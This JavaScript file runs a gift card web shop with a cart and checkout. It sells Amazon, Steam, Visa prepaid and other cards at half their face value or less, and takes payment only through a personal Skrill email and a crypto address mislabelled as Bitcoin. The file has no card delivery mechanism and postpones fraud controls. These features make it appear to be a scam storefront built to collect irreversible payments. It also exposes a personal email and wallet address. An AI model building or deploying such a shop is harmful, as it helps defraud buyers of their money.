// =============================
// CONFIG (EDIT THESE FIRST)
// =============================

// Skrill will be a straight email (as you requested).
const SKRILL_RECEIVER_EMAIL = "gerharduskoortzen13@gmail.com"; // <-- PUT YOUR SKRILL EMAIL HERE

// Bitcoin will be a simple address (as you requested).
const BTC_RECEIVER_ADDRESS = "BNB Smart Chain 0x94628a2EcacE960875a3A9C747611d7519Bfb700"; // <-- PUT YOUR BTC ADDRESS HERE

// Policy values (displayed on checkout + in BTC instructions)
const BTC_REQUIRED_CONFIRMATIONS = 2; // <-- CHANGE THIS
const DELIVERY_MAX_HOURS = 6;         // <-- CHANGE THIS

// =============================
// PRODUCT DATA (EDIT THIS)
// =============================
//
// IMPORTANT: Value vs Price
// - denominations[] = VALUE on the card (balance customer receives)
// - priceMap{}      = YOUR SELLING PRICE (what customer pays)
//
// Example: $50 value card but you sell it for $52 -> profit/premium.
// Example: $50 value card but you sell it for $49 -> discount.
//
const products = [
  {
    id: "amazon",
    brand: "Amazon",
    desc: "Digital gift card delivered via email after payment verification.",
    image:
      "https://m.media-amazon.com/images/I/41QTXj9MXKL._SX425_.jpg",
    currency: "USD",
    denominations: [50, 100, 500, 1000, 2000], // <-- CARD VALUE (balance)
    priceMap: {                    // <-- YOUR SELLING PRICE
      50: 25,
      100: 50,
      500: 250,
      1000: 500,
      2000: 1000,
    },
    inStock: true,
  },
  {
    id: "steam",
    brand: "Steam",
    desc: "Top up Steam Wallet for games, DLC, and more.",
    image:
      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSYN3ZV0eGA-6Z5Uve2lp7geCZmxUsCjTjNAg&s",
    currency: "USD",
    denominations: [50, 100, 500, 1000, 2000],
    priceMap: {
      50: 25,
      100: 50,
      500: 250,
      1000: 500,
      2000: 1000,
    },
    inStock: true,
  },
  {
    id: "Apple",
    brand: "Apple,",
    desc: "Apple,.",
    image:
      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSU97Ct7avDM1PNVjaXKHuzj1zTivJCP2ylOQ&s",
    currency: "USD",
    denominations: [50, 100, 500, 1000, 2000],
    priceMap: {
      50: 25,
      100: 50,
      500: 250,
      1000: 500,
      2000: 1000,
    },
    inStock: true,
  },
{
    id: "DoorDash,",
    brand: "DoorDash",
    desc: "DoorDash",
    image:
      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSUx5TqGrpa5fnQ8YA9w2FQw8U_mwVUkSjbtQ&s",
    currency: "USD",
    denominations: [50, 100, 500, 1000, 2000],
    priceMap: {
      50: 25,
      100: 50,
      500: 250,
      1000: 500,
      2000: 1000,
    },
    inStock: true,
  },
{
    id: "Google Play",
    brand: "Google Play",
    desc: " Google Play",
    image:
      "https://cdn.egifts24.co.za/files/images/products/20-category.jpg?1759484289",
    currency: "USD",
    denominations: [50, 100, 500, 1000, 2000],
    priceMap: {
      50: 25,
      100: 50,
      500: 250,
      1000: 500,
      2000: 1000,
    },
    inStock: true,
  },
{
    id: "Target",
    brand: "Target",
    desc: "Target",
    image:
      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR12OjuMsjMX4n-i8B3myqpcMgxMUS7ZzKODQ&s",
    currency: "USD",
    denominations: [50, 100, 500, 1000, 2000],
    priceMap: {
      50: 25,
      100: 50,
      500: 250,
      1000: 500,
      2000: 1000,
    },
    inStock: true,
  },
{
    id: "Walmart",
    brand: "Walmart",
    desc: "Walmart",
    image:
      "https://i5.walmartimages.com/seo/Basic-Blue-Yellow-Spark-Walmart-Gift-Card_78db1b41-aa29-4639-97c8-eb6c29a61a79.cf20d8f6c5df0d2bc76339fc2d437eb8.png?odnHeight=573&odnWidth=573&odnBg=FFFFFF",
    currency: "USD",
    denominations: [50, 100, 500, 1000, 2000],
    priceMap: {
      50: 25,
      100: 50,
      500: 250,
      1000: 500,
      2000: 1000,
    },
    inStock: true,
  },
{
    id: "Visa prepaid",
    brand: "Visa prepaid",
    desc: "Visa prepaid",
    image:
      "https://m.media-amazon.com/images/I/411YXSuYsFL._SL500_.jpg",
    currency: "USD",
    denominations: [50, 100, 500, 1000, 2000],
    priceMap: {
      50: 25,
      100: 50,
      500: 100,
      1000: 150,
      2000: 300,
    },
    inStock: true,
  },
{
    id: "Mastercard prepaid",
    brand: "Mastercard prepaid",
    desc: "Mastercard prepaid",
    image:
      "https://www.mastercard.com/adobe/dynamicmedia/deliver/dm-aid--0aa87b1b-6703-4e53-bce2-79aecc340727/pink-silk-prepaid-gift-card-1280x720.jpg?preferwebp=true&quality=82",
    currency: "USD",
    denominations: [50, 100, 500, 1000, 2000],
    priceMap: {
      50: 25,
      100: 50,
      500: 100,
      1000: 150,
      2000: 1000,
    },
    inStock: true,
  },
];

// =============================
// CART STATE
// =============================
//
// cart item shape:
// { key, productId, denom, qty, currency, unitPrice }
//
// denom     = card VALUE (balance)
// unitPrice = your SELLING PRICE per 1 card
//
const CART_KEY = "gch_cart_v3";
let cart = loadCart();

let currentCurrency = "USD";
let searchTerm = "";
let sortMode = "featured";

// =============================
// ELEMENTS
// =============================
const gridEl = document.getElementById("grid");
const resultsCountEl = document.getElementById("resultsCount");

const cartBtn = document.getElementById("cartBtn");
const closeCartBtn = document.getElementById("closeCartBtn");
const overlay = document.getElementById("overlay");
const drawer = document.getElementById("cartDrawer");
const cartItemsEl = document.getElementById("cartItems");
const cartCountEl = document.getElementById("cartCount");
const subtotalEl = document.getElementById("subtotal");
const totalEl = document.getElementById("total");
const checkoutBtn = document.getElementById("checkoutBtn");

const searchInput = document.getElementById("searchInput");
const currencySelect = document.getElementById("currencySelect");
const sortSelect = document.getElementById("sortSelect");

// Checkout section
const checkoutSection = document.getElementById("checkoutSection");
const backToShopBtn = document.getElementById("backToShopBtn");
const checkoutSummary = document.getElementById("checkoutSummary");
const buyerEmail = document.getElementById("buyerEmail");
const recipientEmail = document.getElementById("recipientEmail");
const giftMessage = document.getElementById("giftMessage");
const generateOrderBtn = document.getElementById("generateOrderBtn");
const paymentBox = document.getElementById("paymentBox");
const confText = document.getElementById("confText");
const deliveryText = document.getElementById("deliveryText");

// Modal
const productModal = document.getElementById("productModal");
const modalTitle = document.getElementById("modalTitle");
const modalImg = document.getElementById("modalImg");
const modalDesc = document.getElementById("modalDesc");
const denominationSelect = document.getElementById("denominationSelect");
const qtyInput = document.getElementById("qtyInput");
const decQty = document.getElementById("decQty");
const incQty = document.getElementById("incQty");
const modalPrice = document.getElementById("modalPrice");
const addToCartBtn = document.getElementById("addToCartBtn");
const closeModalBtn = document.getElementById("closeModalBtn");

let modalProduct = null;

// =============================
// HELPERS
// =============================
function symbolFor(currency) {
  return currency === "ZAR" ? "R" : "$";
}

function formatMoney(amount, currency) {
  const sym = symbolFor(currency);
  return `${sym}${Number(amount).toFixed(2)}`;
}

function escapeHtml(str) {
  return String(str)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function loadCart() {
  try {
    const raw = localStorage.getItem(CART_KEY);
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

function saveCart() {
  localStorage.setItem(CART_KEY, JSON.stringify(cart));
}

function cartItemKey(productId, currency, denom) {
  return `${productId}:${currency}:${denom}`;
}

function getProduct(id) {
  return products.find((p) => p.id === id) || null;
}

function clamp(n, min, max) {
  return Math.max(min, Math.min(max, n));
}

function getUnitPrice(product, denom) {
  // If you forget to set a sell price, fallback to denom (no profit).
  // Better: ALWAYS define priceMap for each denomination.
  return Number(product.priceMap?.[String(denom)] ?? denom);
}

function productMinMaxPrice(p) {
  const denoms = p.denominations.slice().sort((a, b) => a - b);
  const prices = denoms.map((d) => getUnitPrice(p, d)).sort((a, b) => a - b);
  return { min: prices[0], max: prices[prices.length - 1] };
}

// =============================
// RENDER SHOP GRID
// =============================
function filteredProducts() {
  let list = products
    .filter((p) => p.currency === currentCurrency)
    .filter((p) => {
      if (!searchTerm) return true;
      const hay = `${p.brand} ${p.desc}`.toLowerCase();
      return hay.includes(searchTerm.toLowerCase());
    });

  if (sortMode === "az") list.sort((a, b) => a.brand.localeCompare(b.brand));
  else if (sortMode === "low") list.sort((a, b) => productMinMaxPrice(a).min - productMinMaxPrice(b).min);
  else if (sortMode === "high") list.sort((a, b) => productMinMaxPrice(b).max - productMinMaxPrice(a).max);

  return list;
}

function renderGrid() {
  const list = filteredProducts();
  resultsCountEl.textContent = String(list.length);

  gridEl.innerHTML = list
    .map((p) => {
      const { min, max } = productMinMaxPrice(p);
      const range =
        min === max
          ? formatMoney(min, p.currency)
          : `${formatMoney(min, p.currency)} - ${formatMoney(max, p.currency)}`;

      return `
      <article class="card">
        <img src="${p.image}" alt="${escapeHtml(p.brand)} gift card" loading="lazy" />
        <div class="card-body">
          <div class="card-title">
            <h3>${escapeHtml(p.brand)}</h3>
            <span class="badge ${p.inStock ? "" : "out"}">${p.inStock ? "In stock" : "Out of stock"}</span>
          </div>
          <p class="card-desc">${escapeHtml(p.desc)}</p>

          <div class="card-meta">
            <div class="price-range">${range}</div>
          </div>

          <button class="btn ${p.inStock ? "btn-primary" : ""}" data-open="${p.id}" ${p.inStock ? "" : "disabled"}>
            ${p.inStock ? "Choose balance" : "Unavailable"}
          </button>
        </div>
      </article>
      `;
    })
    .join("");

  gridEl.querySelectorAll("[data-open]").forEach((btn) => {
    btn.addEventListener("click", () => {
      const id = btn.getAttribute("data-open");
      const p = getProduct(id);
      if (p) openModal(p);
    });
  });
}

// =============================
// CART RENDER + OPS
// =============================
function renderCart() {
  const visible = cart.filter((i) => i.currency === currentCurrency);

  cartItemsEl.innerHTML = visible.length
    ? visible
        .map((item) => {
          const p = getProduct(item.productId);
          const title = p ? p.brand : item.productId;

          return `
          <div class="cart-item">
            <div>
              <h4>${escapeHtml(title)}</h4>
              <div class="sub">Value: ${escapeHtml(item.currency)} ${escapeHtml(String(item.denom))} • Unit price: ${formatMoney(item.unitPrice, item.currency)}</div>
              <div class="sub">Qty ${item.qty} • Line: ${formatMoney(item.unitPrice * item.qty, item.currency)}</div>
            </div>

            <div class="cart-controls">
              <button class="small-btn" data-dec="${item.key}" aria-label="Decrease">−</button>
              <button class="small-btn" data-inc="${item.key}" aria-label="Increase">+</button>
              <button class="small-btn danger" data-remove="${item.key}" aria-label="Remove">Remove</button>
            </div>
          </div>
        `;
        })
        .join("")
    : `<p class="muted">Your cart is empty.</p>`;

  const subtotal = visible.reduce((sum, i) => sum + i.unitPrice * i.qty, 0);
  subtotalEl.textContent = formatMoney(subtotal, currentCurrency);
  totalEl.textContent = formatMoney(subtotal, currentCurrency);

  const count = cart.reduce((sum, i) => sum + i.qty, 0);
  cartCountEl.textContent = String(count);

  cartItemsEl.querySelectorAll("[data-dec]").forEach((b) => {
    b.addEventListener("click", () => changeQty(b.getAttribute("data-dec"), -1));
  });
  cartItemsEl.querySelectorAll("[data-inc]").forEach((b) => {
    b.addEventListener("click", () => changeQty(b.getAttribute("data-inc"), +1));
  });
  cartItemsEl.querySelectorAll("[data-remove]").forEach((b) => {
    b.addEventListener("click", () => removeItem(b.getAttribute("data-remove")));
  });
}

function addToCart(productId, denom, qty, currency, unitPrice) {
  const key = cartItemKey(productId, currency, denom);
  const existing = cart.find((i) => i.key === key);
  if (existing) existing.qty += qty;
  else cart.push({ key, productId, denom, qty, currency, unitPrice });

  saveCart();
  renderCart();
}

function changeQty(key, delta) {
  const item = cart.find((i) => i.key === key);
  if (!item) return;
  item.qty = clamp(item.qty + delta, 1, 999);
  saveCart();
  renderCart();
}

function removeItem(key) {
  cart = cart.filter((i) => i.key !== key);
  saveCart();
  renderCart();
}

// =============================
// PRODUCT MODAL
// =============================
function openModal(product) {
  modalProduct = product;

  modalTitle.textContent = product.brand;
  modalDesc.textContent = product.desc;
  modalImg.src = product.image;
  modalImg.alt = `${product.brand} gift card`;

  denominationSelect.innerHTML = product.denominations
    .slice()
    .sort((a, b) => a - b)
    .map((d) => `<option value="${d}">${formatMoney(d, product.currency)} value</option>`)
    .join("");

  qtyInput.value = "1";
  updateModalPrice();

  productModal.classList.remove("hidden");
  productModal.setAttribute("aria-hidden", "false");
}

function closeModal() {
  productModal.classList.add("hidden");
  productModal.setAttribute("aria-hidden", "true");
  modalProduct = null;
}

function updateModalPrice() {
  if (!modalProduct) return;

  const denom = Number(denominationSelect.value || modalProduct.denominations[0]);
  const qty = clamp(Number(qtyInput.value || 1), 1, 999);
  qtyInput.value = String(qty);

  const unitPrice = getUnitPrice(modalProduct, denom);
  modalPrice.textContent = formatMoney(unitPrice * qty, modalProduct.currency);
}

// =============================
// DRAWER
// =============================
function openCart() {
  overlay.classList.remove("hidden");
  drawer.classList.remove("hidden");
  overlay.setAttribute("aria-hidden", "false");
  drawer.setAttribute("aria-hidden", "false");
}

function closeCart() {
  overlay.classList.add("hidden");
  drawer.classList.add("hidden");
  overlay.setAttribute("aria-hidden", "true");
  drawer.setAttribute("aria-hidden", "true");
}

// =============================
// CHECKOUT (MANUAL PAYMENT INSTRUCTIONS)
// =============================
function openCheckout() {
  closeCart();
  closeModal();

  // Fill policy placeholders (X values)
  confText.textContent = String(BTC_REQUIRED_CONFIRMATIONS);
  deliveryText.textContent = String(DELIVERY_MAX_HOURS);

  renderCheckoutSummary();

  checkoutSection.classList.remove("hidden");
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function closeCheckout() {
  checkoutSection.classList.add("hidden");
  paymentBox.innerHTML = "Generate an Order ID to view payment details.";
}

function renderCheckoutSummary() {
  const visible = cart.filter((i) => i.currency === currentCurrency);
  if (!visible.length) {
    checkoutSummary.innerHTML = "<p>Your cart is empty.</p>";
    return;
  }

  const lines = visible.map((i) => {
    const p = getProduct(i.productId);
    const name = p ? p.brand : i.productId;
    return `<div>• ${escapeHtml(name)} — value ${escapeHtml(String(i.denom))} — qty ${i.qty} — unit ${formatMoney(i.unitPrice, i.currency)}</div>`;
  });

  const total = visible.reduce((sum, i) => sum + i.unitPrice * i.qty, 0);

  checkoutSummary.innerHTML = `
    ${lines.join("")}
    <div style="margin-top:10px;"><strong>Total:</strong> <span class="mono">${formatMoney(total, currentCurrency)}</span></div>
  `;
}

// Generates an Order ID (required feature)
function generateOrderId() {
  // Example: GCH-20260302-4831
  const now = new Date();
  const y = now.getFullYear();
  const m = String(now.getMonth() + 1).padStart(2, "0");
  const d = String(now.getDate()).padStart(2, "0");
  const rand = String(Math.floor(1000 + Math.random() * 9000));
  return `GCH-${y}${m}${d}-${rand}`;
}

// Shows BTC + Skrill payment instructions (required feature)
function renderPaymentInstructions(orderId) {
  const visible = cart.filter((i) => i.currency === currentCurrency);
  const total = visible.reduce((sum, i) => sum + i.unitPrice * i.qty, 0);

  paymentBox.innerHTML = `
    <div><strong>Order ID:</strong> <span class="mono">${escapeHtml(orderId)}</span></div>
    <div style="margin-top:8px;"><strong>Amount:</strong> <span class="mono">${formatMoney(total, currentCurrency)}</span></div>

    <hr class="sep">

    <div><strong>Skrill</strong></div>
    <div>Send the <strong>exact</strong> amount to:</div>
    <div class="mono">${escapeHtml(SKRILL_RECEIVER_EMAIL)}</div>
    <div style="margin-top:6px;"><strong>Reference/Note:</strong> <span class="mono">${escapeHtml(orderId)}</span></div>

    <hr class="sep">

    <div><strong>Bitcoin (BTC)</strong></div>
    <div>Send payment to:</div>
    <div class="mono">${escapeHtml(BTC_RECEIVER_ADDRESS)}</div>
    <div style="margin-top:6px;">Fulfillment after <strong>${BTC_REQUIRED_CONFIRMATIONS}</strong> confirmations.</div>

    <div style="margin-top:12px;" class="muted">
      Policy reminder: underpayments are not fulfilled. Delivery can take up to ${DELIVERY_MAX_HOURS} hours.
    </div>
  `;
}

// =============================
// EVENTS
// =============================
cartBtn.addEventListener("click", () => { renderCart(); openCart(); });
closeCartBtn.addEventListener("click", closeCart);

overlay.addEventListener("click", () => {
  closeCart();
  closeModal();
});

closeModalBtn.addEventListener("click", closeModal);

searchInput.addEventListener("input", (e) => {
  searchTerm = e.target.value || "";
  renderGrid();
});

currencySelect.addEventListener("change", (e) => {
  currentCurrency = e.target.value;
  renderGrid();
  renderCart();
  renderCheckoutSummary();
});

sortSelect.addEventListener("change", (e) => {
  sortMode = e.target.value;
  renderGrid();
});

denominationSelect.addEventListener("change", updateModalPrice);
qtyInput.addEventListener("input", updateModalPrice);

decQty.addEventListener("click", () => {
  qtyInput.value = String(clamp(Number(qtyInput.value || 1) - 1, 1, 999));
  updateModalPrice();
});
incQty.addEventListener("click", () => {
  qtyInput.value = String(clamp(Number(qtyInput.value || 1) + 1, 1, 999));
  updateModalPrice();
});

addToCartBtn.addEventListener("click", () => {
  if (!modalProduct) return;

  const denom = Number(denominationSelect.value);
  const qty = clamp(Number(qtyInput.value || 1), 1, 999);
  const unitPrice = getUnitPrice(modalProduct, denom);

  addToCart(modalProduct.id, denom, qty, modalProduct.currency, unitPrice);
  closeModal();
  renderCart();
  openCart();
});

checkoutBtn.addEventListener("click", () => {
  const visible = cart.filter((i) => i.currency === currentCurrency);
  if (!visible.length) return alert("Your cart is empty.");
  openCheckout();
});

backToShopBtn.addEventListener("click", () => {
  closeCheckout();
});

// When clicked, generates Order ID + shows BTC/Skrill instructions + policy is already visible.
generateOrderBtn.addEventListener("click", () => {
  const visible = cart.filter((i) => i.currency === currentCurrency);
  if (!visible.length) return alert("Your cart is empty.");

  if (!buyerEmail.value.trim() || !recipientEmail.value.trim()) {
    return alert("Please enter buyer and recipient email.");
  }

  const orderId = generateOrderId();
  renderPaymentInstructions(orderId);

  // NOTE: Later you'll save this as a PENDING order in a database and add fraud controls.
});

// Close with ESC
document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") {
    closeCart();
    closeModal();
  }
});

// =============================
// INITIAL RENDER
// =============================
currencySelect.value = currentCurrency;
sortSelect.value = sortMode;
renderGrid();

renderCart();


